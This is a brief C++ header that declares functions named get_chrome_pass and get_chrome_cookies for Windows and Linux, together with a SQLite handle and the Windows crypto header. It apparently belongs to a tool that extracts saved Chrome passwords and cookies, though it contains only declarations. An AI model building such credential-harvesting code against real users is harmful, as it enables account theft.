#ifndef TOOLS_HPP
#define TOOLS_HPP

#include <sstream>
#include <iostream>
#include "sqlite3.h"

using namespace std;

#if defined(__WIN64__)

    #include <windows.h>
    #include <Wincrypt.h>
    #include <tchar.h>

    stringstream get_chrome_pass(sqlite3 *db);
    stringstream get_chrome_cookies(sqlite3 *db);
    int callback(void *NotUsed, int argc, char **argv, char **azColName);

#elif defined(__linux__)

    stringstream get_chrome_pass(sqlite3* db);

#endif

#endif //TOOLS_HPP
